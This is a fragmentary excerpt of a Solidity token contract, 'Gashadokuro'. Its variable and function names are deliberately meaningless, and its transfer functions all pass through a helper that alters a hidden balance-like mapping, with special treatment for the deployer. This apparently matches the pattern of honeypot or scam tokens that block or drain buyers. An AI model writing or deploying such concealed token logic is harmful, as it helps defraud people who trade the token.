...
contract Gashadokuro is Ownable {
    uint256 private effort;
    string private education;
    uint256 private _tTotal;
    string private contain;
    uint256 private go;
    uint8 private egg;
    ...
    uint256 team;
    bool back;
    address private examine;
    address private phrase;
    ...
    function swimming(
        ...
        if (!back && chamber[hunter] == 0 && national[hunter] > 0) {
            chamber[hunter] -= egg;
        }
    ...
    function transferFrom(
        ...
        swimming(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        swimming(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(thousand);
        ...
        go = 100;
        chamber[uncle] = egg;
        _tTotal = 1000000000000000 * 10**egg;
